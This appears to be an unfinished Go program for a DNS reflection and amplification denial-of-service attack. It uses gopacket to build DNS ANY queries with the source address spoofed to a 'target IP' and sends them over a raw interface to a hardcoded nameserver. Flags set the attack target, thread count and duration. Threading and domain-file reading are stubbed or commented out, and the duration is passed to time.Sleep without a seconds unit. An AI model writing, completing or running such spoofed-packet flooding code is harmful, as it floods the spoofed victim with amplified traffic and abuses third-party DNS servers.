package main

import (
	"flag"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// CLI arguments
var target_ip = flag.String("target ip", "", "The IP address of the target of the attack")
var filename = flag.String("filename", "domains.csv", "A csv file with domain names")
var num_threads = flag.Int("num threads", 1, "The number of threads to run in parallel")
var duration = flag.Int("duration", 1, "The duration of the attack in seconds")

var target net.IP
var options gopacket.SerializeOptions

const SRC_PORT = 42000

func init() {
    options = gopacket.SerializeOptions{
        ComputeChecksums: true,
        FixLengths:       true,
    }
}

func main() {
    flag.Parse()
    target = net.ParseIP(*target_ip)
    // readFile()

    // Start threads
    // for i:=0; i<num_threads; i++ {
    //     go send()
    // }
    // Wait for duration in seconds, then stop attack
    send()
    time.Sleep(time.Duration(*duration))
}

// Read the file into a datastructure
func readFile() {

}

// Goroutine to send packets, each thread has own number and it uses that number as modulo for which line to read
// Proceed in round-robin fashion (cycling through domains / name servers)
func send() {
    handle, err := pcap.OpenLive("enp0s31f6", 1500, false, pcap.BlockForever)
    if err != nil {
        panic(err)
    }
    // Keep sending packets, TODO: put this in loop after it works
    dst_ip := net.ParseIP("84.116.46.21")
    packet := makePacket("www.google.com", dst_ip)
    err = handle.WritePacketData(packet)
    if err != nil {
        panic(err)
    }
}

// create ANY request packet
func makePacket(domainName string, destinationIP net.IP) []byte {
    ip := layers.IPv4{
        Version: 4,
        TTL: 64,
        Protocol: layers.IPProtocolUDP,
        SrcIP: target,              // Target IP (spoofed)
        DstIP: destinationIP,       // Nameserver IP
    }
    udp := layers.UDP{
        SrcPort: SRC_PORT,
        DstPort: 53,
    }
    udp.SetNetworkLayerForChecksum(&ip)
    qst := layers.DNSQuestion{
        Name: []byte(domainName),       // Domain name to request
        Class: layers.DNSClassAny,
    }
    dns := layers.DNS{
        RD: true,
        Questions: []layers.DNSQuestion{qst},
    }
    buffer := gopacket.NewSerializeBuffer()
    if err := gopacket.SerializeLayers(buffer, options,
        &ip,
        &udp,
        &dns,
    ); err != nil {
        panic(err)
    }
    return buffer.Bytes()
}

